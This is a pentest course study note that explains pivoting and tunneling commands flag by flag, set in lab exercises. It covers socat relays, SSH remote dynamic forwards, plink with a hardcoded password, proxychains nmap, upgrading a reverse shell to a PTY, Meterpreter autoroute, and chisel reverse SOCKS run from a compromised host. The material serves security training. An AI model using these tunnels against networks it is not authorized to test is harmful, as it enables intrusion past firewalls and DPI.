# Pivoting & Tunneling (Breakdowns)

Part of [[COMMAND BREAKDOWNS]]. Full teardowns for the most non-obvious commands from [[19. Port Redirection and SSH Tunneling|Port Redirection and SSH Tunneling]].

---

## Socat port forward with fork and verbose flags

**Full command:**
```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

**Piece by piece:**
- `socat` → Swiss Army knife networking tool. Unlike `nc`, it can relay (input AND output) without a named pipe.
- `-ddd` → verbose logging, three levels deep. `-d` alone shows fatal errors. `-dd` shows warnings. `-ddd` shows info: every connection accepted, every byte relayed. Essential for troubleshooting a silent forward.
- `TCP-LISTEN:2345` → open a TCP listener on port 2345 on all interfaces. This is the "left side" of socat: the endpoint your tool (psql, smbclient, etc.) connects to.
- `,fork` → comma-separated option on the LISTEN address. Creates a new subprocess per incoming connection instead of dying after the first one. Without `fork`, socat exits after one connection and any subsequent attempt (e.g. a second psql query) fails silently.
- `TCP:10.4.50.215:5432` → the "right side": connect to this address and relay bytes bidirectionally. Socat makes two sockets and glues them together. Traffic in on port 2345 flows out to 10.4.50.215:5432 and vice versa.

**Where this comes from:** [[19. Port Redirection and SSH Tunneling#19.2.3 Port Forwarding with Socat|19.2.3]]. Socat man page has the ADDRESS syntax; the important insight is that LISTEN address options (fork, reuseaddr, etc.) come after the port number separated by commas.

**Where to look in the response:** socat outputs per-connection lines like `socat[PID] N using stdout` and `socat[PID] N accepting connection from AF=2 ...`. If you see "accepting connection" the forward is alive. If psql still can't connect, the issue is the right-side TCP (PGDATABASE01:5432 is unreachable from the pivot), not socat itself.

🔁 **Seen in:** [[19. Port Redirection and SSH Tunneling#19.2.3 Port Forwarding with Socat|19.2.3 Socat lab]]

---

## SSH remote dynamic port forward: single-socket -R

**Full command:**
```bash
ssh -N -R 9998 kali@192.168.118.4
```

**Piece by piece:**
- `ssh` → standard OpenSSH client.
- `-N` → don't open a remote shell. This connection's only purpose is tunneling. Without `-N`, SSH opens a shell, which is fine but wasteful and leaves a session visible in `ps`.
- `-R 9998` → remote port forward. The tricky part: classic `-R` takes three arguments (`BIND_ADDR:BIND_PORT:DEST_IP:DEST_PORT`). When you pass only ONE socket (`9998`), OpenSSH 7.6+ interprets it as "open a SOCKS proxy on port 9998 at the SSH SERVER (Kali), and let the SSH CLIENT (pivot) forward traffic wherever SOCKS requests point." This is remote dynamic port forwarding.
- `kali@192.168.118.4` → SSH into Kali. The pivot is the SSH client; Kali is the SSH server. This flips the direction compared to local/dynamic forwarding, which is what lets it bypass an inbound firewall on the pivot.

**Why only ONE argument to -R?** Classic remote port forward (`-R ADDR:PORT:DEST:DPORT`) forwards to a FIXED destination. Dynamic (`-R PORT`) creates a SOCKS proxy that can reach ANY destination the pivot can route to. Same idea as the difference between `-L` (local, fixed) and `-D` (local, SOCKS). The single-argument form was added in OpenSSH 7.6 on the CLIENT side.

**Where this comes from:** `man ssh` under PORT FORWARDING. The key wording is "If the `host` argument is not supplied, the listening side acts as a SOCKS 4/5 proxy." The OpenSSH 7.6 requirement is on the CLIENT (the pivot initiating the connection), not the server.

**Where to look in the response:** on Kali, run `ss -ntplu` after connecting and look for a `127.0.0.1:9998` entry owned by `sshd`. If it's not there, the forward didn't bind (version too old, or a conflict on that port -- pick a different one).

🔁 **Seen in:** [[19. Port Redirection and SSH Tunneling#19.3.4 SSH Remote Dynamic Port Forwarding|19.3.4]], [[19. Port Redirection and SSH Tunneling#19.4.1 ssh.exe (OpenSSH for Windows)|19.4.1]]

---

## Plink key-acceptance pipe trick for non-interactive shells

**Full command:**
```cmd
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

**Piece by piece:**
- `cmd.exe /c echo y` → run `echo y` in a cmd subprocess and return. Outputs the literal string `y` followed by a newline. The `/c` flag means run the command and then exit (vs `/k` which keeps the cmd window open).
- `|` → pipe the stdout of `cmd.exe /c echo y` into the stdin of plink.exe. Plink, when it encounters an unknown SSH host key, prints a prompt and reads ONE line from stdin to decide whether to accept. Piping `y` feeds that answer automatically.
- `plink.exe` → PuTTY's CLI SSH client. Standalone exe, no install needed.
- `-ssh` → explicitly specify SSH protocol (plink also supports Telnet/Rlogin; `-ssh` avoids ambiguity).
- `-l kali` → SSH login username (Plink syntax for specifying the remote user; different from OpenSSH's `user@host` format).
- `-pw kali` → password in plaintext on the command line. Visible in process listings -- use a dedicated limited user in real engagements.
- `-R 127.0.0.1:9833:127.0.0.1:3389` → remote port forward. Syntax identical to OpenSSH: listen on Kali loopback port 9833, forward to `127.0.0.1:3389` as seen FROM the Windows pivot (i.e. RDP on the Windows box itself).
- `192.168.118.4` → Kali's IP (the SSH server end).

**Why can't you just type "y" at the prompt?** A web shell or reverse shell has no TTY. The host key prompt is printed but nothing reads from a real terminal. The `echo y |` approach pre-answers the question via stdin redirection before plink even starts waiting.

**Where this comes from:** [[19. Port Redirection and SSH Tunneling#19.4.2 Plink (PuTTY Link)|19.4.2]]. PuTTY docs cover the `-l`/`-pw` flags; the pipe trick is common knowledge from remote administration scripts.

**Where to look in the response:** after the command runs, check Kali with `ss -ntplu` for `127.0.0.1:9833`. Then `xfreerdp /v:127.0.0.1:9833 /u:rdp_admin /p:'P@ssw0rd!'`.

🔁 **Seen in:** [[19. Port Redirection and SSH Tunneling#19.4.2 Plink (PuTTY Link)|19.4.2 Plink lab]]

---

## nmap through proxychains: mandatory flags

**Full command:**
```bash
proxychains nmap -vvv -sT -Pn -n 172.16.50.217
```

**Piece by piece:**
- `proxychains` → LD_PRELOAD-based network redirector. Intercepts libc socket calls and reroutes them through the configured SOCKS proxy. Works on dynamically-linked binaries only.
- `nmap` → being hooked by proxychains so its TCP connections route through the SOCKS proxy.
- `-vvv` → triple verbose. Through a proxy, timeouts are long and silence can be alarming. Verbose output shows individual port attempts as they happen so you know it's actually working.
- `-sT` → TCP connect scan. This is mandatory through proxychains. `-sS` (SYN scan) sends raw IP packets that bypass libc socket calls entirely, so proxychains can't intercept them. `-sT` uses the normal connect() syscall, which proxychains can hook.
- `-Pn` → skip host discovery (no ping). ICMP echo requests also bypass libc hooks and would go direct, not through the proxy, revealing Kali's real IP and getting no answer from the internal host anyway.
- `-n` → no DNS resolution. DNS queries would stall (they're UDP and typically don't go through SOCKS proxies) or leak your target to a DNS resolver.
- `172.16.50.217` → the internal host being scanned. Normally unreachable from Kali directly; the SOCKS proxy routes packets via the pivot.

**What changes for speed:** add `--top-ports=20` or `-p PORT` to limit scope. The default timing is generous; reduce `tcp_read_time_out` and `tcp_connect_time_out` in `/etc/proxychains4.conf` to speed it up (default values are high enough to cause per-port delays that stack badly across a full scan).

**Where this comes from:** [[19. Port Redirection and SSH Tunneling#19.3.2 SSH Dynamic Port Forwarding|19.3.2]]. The `-sT`/`-Pn`/`-n` trio is documented in nmap's manual under "Scan Types" and "Host Discovery"; proxychains docs note the LD_PRELOAD limitation explicitly.

**Where to look in the response:** proxychains shows each connection attempt like `[proxychains] Strict chain ... 192.168.50.63:9999 ... 172.16.50.217:PORT ...`. A line ending in `OK` means the port is open. `TIMEOUT` means closed/filtered or the proxy is unreachable.

🔁 **Seen in:** [[19. Port Redirection and SSH Tunneling#19.3.2 SSH Dynamic Port Forwarding|19.3.2]], [[19. Port Redirection and SSH Tunneling#19.3.4 SSH Remote Dynamic Port Forwarding|19.3.4]], [[19. Port Redirection and SSH Tunneling#19.4.1 ssh.exe (OpenSSH for Windows)|19.4.1]]

---

## PTY upgrade before SSH from a non-interactive shell

**Full command:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Piece by piece:**
- `python3 -c` → run a Python3 one-liner.
- `import pty` → Python's built-in pseudo-terminal module. Creates a PTY (pseudo-terminal) pair: one side connected to the new process, one side connected to the current shell.
- `pty.spawn("/bin/bash")` → fork bash under the PTY. From this point, stdin/stdout/stderr go through an actual TTY device file, which means line-buffered input, terminal control codes (Ctrl+C, cursor movement), and crucially: programs that check `isatty()` before showing prompts will now see a real terminal and show their prompt.

**Why this unlocks SSH password prompts:** `ssh` calls `isatty(STDIN_FILENO)` before displaying the `password:` prompt. In a plain reverse netcat shell, stdin is a pipe (not a TTY), so `isatty()` returns false and ssh either hangs silently or exits with "no password supplied". After spawning a PTY shell, `isatty()` returns true and the prompt appears and can be answered.

**Why `-o StrictHostKeyChecking=no` is also needed:** the user running the shell (e.g. `confluence`) may not have write permissions to `~/.ssh/known_hosts`. Without the flag, SSH aborts when it can't record the host key. The flag tells SSH to accept the key and not try to save it.

**Where this comes from:** standard PTY upgrade technique. pty module is Python 3 standard library. The `isatty()` root cause is documented in OpenSSH source (`readpass.c`).

**Where to look in the response:** after `pty.spawn()`, the prompt changes to look like a normal bash prompt with user/hostname. Then you can type `ssh -N -R ...` and the password prompt appears normally.

🔁 **Seen in:** [[19. Port Redirection and SSH Tunneling#19.3.1 SSH Local Port Forwarding|19.3.1]], [[19. Port Redirection and SSH Tunneling#19.3.3 SSH Remote Port Forwarding|19.3.3]], [[19. Port Redirection and SSH Tunneling#19.3.4 SSH Remote Dynamic Port Forwarding|19.3.4]] -- every lab where SSH tunneling was initiated from a reverse shell

---

## Meterpreter autoroute + socks_proxy: why this replaces ssh -D

**Full command sequence:**
```
bg
use auxiliary/server/socks_proxy
set SRVPORT 9050; set SRVHOST 0.0.0.0; set VERSION 4a
run

sessions -i 1
run autoroute -s 172.16.5.0/23
```

**Piece by piece:**
- `bg` → backgrounds the active Meterpreter session into a numbered session slot. The session stays alive; you're just returning to the msfconsole prompt so you can run more modules.
- `use auxiliary/server/socks_proxy` → loads a module that opens a SOCKS proxy server on Kali. It listens for proxychains connections on the configured port and forwards them through whatever routes are registered in the Metasploit routing table.
- `set VERSION 4a` → SOCKS4a (not SOCKS5). The SOCKS4a variant is accepted by proxychains' `socks4` ProxyList entry. SOCKS5 requires a different proxychains entry (`socks5`) and different authentication semantics; 4a is simpler and works for the TCP forwarding use case here.
- `run` (as background job) → starts the SOCKS server without occupying the console. The server stays alive in the background alongside your session.
- `sessions -i 1` → re-attaches to session 1. Required for autoroute because autoroute runs inside the context of a specific session.
- `run autoroute -s 172.16.5.0/23` → registers a route in the MSF routing table: "to reach anything in 172.16.5.0/23, send traffic through this session." The socks_proxy module sees this table and knows to forward proxychained traffic for those addresses via the session's tunnel.

**Why this vs SSH -D:** SSH dynamic port forwarding (`ssh -D`) requires an SSH server on the pivot host and working SSH credentials. It opens a SOCKS proxy on the SSH client side. Meterpreter's approach requires neither, it uses the existing Meterpreter reverse TCP channel (which is already established through whatever firewall hole the initial shell came from) and routes new traffic through that same channel using Metasploit's internal routing layer.

**The traffic path:** `proxychains tool` → `127.0.0.1:9050` (socks_proxy) → `Metasploit routing table lookup` → `Meterpreter session channel` → `pivot host network stack` → `172.16.5.x target`.

**Where this comes from:** Metasploit's autoroute post module docs (`run post/multi/manage/autoroute`). The auxiliary/server/socks_proxy module help page.

🔁 **Seen in:** [[19. Port Redirection and SSH Tunneling|PT.1]]

---

## ptunnel-ng static build: the autogen.sh sed patch and why static linking

**Full command:**
```bash
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
```

**Piece by piece:**
- `sed -i '$s/.../.../` → in-place edit (`-i`) of `autogen.sh`. `$s` means: match and replace on the LAST LINE of the file only (`$` anchors to the end). The last line in the original `autogen.sh` is the `configure` invocation, the sed replaces it entirely with a modified version that adds static-linking flags.
- `LDFLAGS=-static` → passes `-static` to the linker. This tells `ld` (the linker) to link all libraries into the binary rather than referencing shared library files. The result is a self-contained ELF that carries its own copies of libc, libpcap, etc.
- `--enable-static` → tells the `./configure` script to prefer static library paths where available. Reinforces the `LDFLAGS` directive at the configure level.
- `make -j${BUILDJOBS:-4} all` → parallel build using 4 threads (or whatever `$BUILDJOBS` is set to). `:-4` is bash default expansion: "use $BUILDJOBS if set, otherwise 4".

**Why static-link for pivoting:** when you transfer a binary to a pivot host, that host may have different library versions (different libc version, missing libpcap, etc.) than the build machine. A dynamically-linked binary will fail with `error while loading shared libraries: libpcap.so.1: cannot open shared object file` if the pivot host doesn't have the right version. A static binary carries everything it needs. It's larger, but it runs without dependencies.

**How to verify the result is actually static:**
```bash
file ptunnel-ng/src/ptunnel-ng
# should include "statically linked" in the output
ldd ptunnel-ng/src/ptunnel-ng
# should print "not a dynamic executable"
```

**Where this comes from:** ptunnel-ng GitHub README (build instructions), GCC/ld static linking documentation.

🔁 **Seen in:** [[19. Port Redirection and SSH Tunneling|PT.6]]

---

## Chisel reverse SOCKS chain: `chisel server --reverse` + `chisel client R:socks`

**Full command pair:**
```bash
# Kali:
chisel server --port 8080 --reverse

# CONFLUENCE01 (via web injection):
/tmp/chisel client 192.168.45.173:8080 R:socks
```

**Piece by piece — server side:**
- `chisel server` → run as server mode. Listens for incoming Chisel client connections.
- `--port 8080` → bind the HTTP listener on port 8080. Chisel uses HTTP/WebSocket as its transport; port 8080 is a common alt-HTTP port that DPI solutions typically allow alongside 80.
- `--reverse` → critical flag. Without it, the server ignores reverse tunnel requests from clients. With it, clients can open listening ports on the server side (the R: prefix in client args). Without `--reverse`, `R:socks` on the client side silently fails.

**Piece by piece — client side:**
- `chisel client <ip>:<port>` → connect to the Chisel server at the given address.
- `R:socks` → the remote/reverse tunnel spec. `R:` prefix means "create a listener on the SERVER side". `socks` is shorthand for `socks5`, create a SOCKS5 proxy. The actual port defaults to 1080 on the server's loopback (`127.0.0.1:1080`). You could also write `R:1080:socks` to be explicit.

**What happens under the hood:** the client upgrades the HTTP connection to a WebSocket connection (visible in tcpdump as a GET with `Upgrade: websocket` and `Sec-WebSocket-Protocol: chisel-v3`). All subsequent tunnel data travels over this WebSocket, which is valid HTTP traffic from the DPI's perspective. Inside, it's SSH-encrypted.

**How to confirm it worked:** on Kali, `ss -ntplu | grep 1080` shows `tcp LISTEN 127.0.0.1:1080 ... chisel`. The Chisel server output shows `tun: proxy#R:127.0.0.1:1080=>socks: Listening`.

🔁 **Seen in:** [[20. Tunneling Through Deep Packet Inspection#20.1.2 HTTP Tunneling with Chisel|Tunneling Through Deep Packet Inspection#20.1.2 HTTP Tunneling with Chisel]]

---

## SSH ProxyCommand with ncat: routing SSH through a SOCKS proxy

**Full command:**
```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.249.215
```

**Piece by piece:**
- `ssh -o ProxyCommand='...'` → instead of connecting to the destination directly, SSH runs the given shell command and uses its stdin/stdout as the transport channel. This is the generic SSH proxy mechanism, it works with any program that can open a socket.
- `ncat` → the Nmap project's Netcat reimplementation. Unlike Kali's default `nc`, ncat supports SOCKS proxying via `--proxy-type` and `--proxy`. Install with `sudo apt install ncat`.
- `--proxy-type socks5` → tells ncat to use SOCKS5 protocol when speaking to the proxy server.
- `--proxy 127.0.0.1:1080` → the SOCKS proxy address. Here, `127.0.0.1:1080` is where Chisel bound its reverse SOCKS proxy on Kali's loopback.
- `%h` → SSH substitution token for the destination host (filled in from the `ssh user@host` argument at runtime, here `10.4.249.215`).
- `%p` → SSH substitution token for the destination port (filled in from `-p PORT` or defaults to 22).

**Traffic path:** SSH process → `ncat` → SOCKS5 negotiation to `127.0.0.1:1080` (Chisel) → HTTP WebSocket tunnel → CONFLUENCE01 → TCP connection to PGDATABASE01:22 → SSH handshake continues as normal.

**Why not proxychains ssh?** `proxychains ssh` works but ProxyCommand is cleaner, it doesn't require editing `/etc/proxychains4.conf` and is fully self-contained in the command line. It's also more reliable with interactive SSH sessions (proxychains sometimes struggles with terminal control).

**Why not OpenBSD nc?** The version of `nc` shipped with Kali (`netcat-openbsd`) dropped the `-X` SOCKS proxy flag in some builds. `ncat` is the reliable cross-distro substitute.

🔁 **Seen in:** [[20. Tunneling Through Deep Packet Inspection#20.1.2 HTTP Tunneling with Chisel|20.1.2 Chisel lab]], [[19. Port Redirection and SSH Tunneling|Port Redirection and SSH Tunneling]]

---

## `ssh -fNL`: background local port forward flags explained

**Full command:**
```bash
ssh -fNL 4141:127.0.0.1:4141 kali@192.168.249.7
```

**Piece by piece:**
- `ssh` → standard OpenSSH client.
- `-f` → fork to background after authenticating. SSH daemonizes itself and returns your shell prompt immediately. Useful when you only want the port forward, not an interactive session.
- `-N` → don't execute a remote command / don't open a remote shell. Combined with `-f`, this creates a "silent" background tunnel that consumes no terminal.
- `-L 4141:127.0.0.1:4141` → local port forward. Kali binds `127.0.0.1:4141` and forwards connections through the SSH tunnel to `127.0.0.1:4141` on the SSH server (FELINEAUTHORITY). The first `4141` is the Kali-side port; `127.0.0.1:4141` is the destination as seen from FELINEAUTHORITY.
- `kali@192.168.249.7` → SSH to FELINEAUTHORITY as the kali user. The SSH connection is the underlying transport for the port forward.

**The use case:** dnscat2's `listen 0.0.0.0:4141 ...` binds a port on FELINEAUTHORITY. But the exercise client hardcodes `127.0.0.1:4141` (Kali's loopback). The `-fNL` brings FELINEAUTHORITY's port 4141 to Kali's loopback so the tool works without modification.

**General pattern:** whenever a local tool hardcodes `127.0.0.1:PORT` but the real listener is on a remote host, `ssh -fNL PORT:127.0.0.1:PORT user@remote` bridges the gap.

**How to confirm:** after the command, `ss -ntplu | grep 4141` on Kali shows `127.0.0.1:4141` owned by `ssh`.

**Killing it:** `pkill -f "ssh -fNL"` or `kill $(lsof -ti:4141)`.

🔁 **Seen in:** [[20. Tunneling Through Deep Packet Inspection#20.2.2 DNS Tunneling with dnscat2|20.2.2 dnscat2 lab]]

---

## Chisel dual-remote: combined reverse SOCKS + specific port forward

**Full command (Windows pivot):**
```powershell
.\chisel.exe client <KALI>:8080 R:1081:socks R:80:172.16.6.241:80
```

**Piece by piece:**
- `client <KALI>:8080` → connect outbound from the pivot to the Chisel server on Kali port 8080. This is the pivot initiating the connection — it bypasses inbound firewall rules on the pivot that would block Kali from connecting in.
- `R:1081:socks` → ask the Kali server to open a SOCKS5 proxy listener on `127.0.0.1:1081`. The `R:` prefix means "on the SERVER side" (Kali), not the client. `socks` is shorthand for `socks5`. You could write `R:1081:socks5` equivalently. All traffic directed at Kali:1081 via proxychains will be forwarded through the pivot to wherever the SOCKS request points (the pivot's entire reachable network).
- `R:80:172.16.6.241:80` → ask the Kali server to open port 80 on `127.0.0.1:80` and forward it to `172.16.6.241:80` via the pivot. This means `http://127.0.0.1/` (or a named hostname pointing there via `/etc/hosts`) is transparently proxied to INTERNALSRV1's web server — no SOCKS needed for browser traffic to that one host.

**Why combine both into one command?** Both remotes ride the same single outbound WebSocket connection. You could run two separate chisel.exe processes, one for each remote, but that means two connections, two instances (and the file-lock problem when overwriting chisel.exe between launches). A single command is simpler and uses fewer resources.

**The `R:socks` port vs `R:80` port:** these are independent. The SOCKS proxy (`127.0.0.1:1081`) is configured in `/etc/proxychains4.conf` and used by any tool prefixed with `proxychains`. The specific port forward (`127.0.0.1:80`) is used directly — add `127.0.0.1 internalsrv1.beyond.com` to `/etc/hosts` and browsers/curl/burp hit it without proxychains.

**Stale process problem:** if a previous chisel.exe is still running on the pivot, the file is locked and `iwr -Outfile chisel.exe` fails. Always `taskkill /F /IM chisel.exe` first. If multiple background instances exist from previous attempts, taskkill kills them all — verify with `tasklist | findstr chisel` before re-downloading.

**Clock sync interaction:** Chisel uses WebSocket over HTTP. The WebSocket handshake includes `Sec-WebSocket-Key` but not a time-based token, so Chisel itself is not clock-sensitive. However, if Kerberos tools are being run through the SOCKS tunnel, the underlying Kerberos protocol IS clock-sensitive — sync before establishing the tunnel to avoid having to tear it down and resync (which is disruptive).

🔁 **Seen in:** [[27. Assembling the Pieces#27.4.2 Services and Sessions — Internal Network Scan|Module 27 §27.4.2]]

---

#### Tags: #CommandBreakdowns #Pivoting #PortForwarding #SSH #Socat #Proxychains #Plink #Meterpreter #autoroute #ptunnel-ng #StaticBuild #ICMP #Chisel #ProxyCommand #Ncat #dnscat2 #DPI #HTTPTunnel #DNSTunnel #Module19 #Module20 #HTBSupplementary #DualRemote #CombinedTunnel #Module27
## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for payload troubleshooting
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
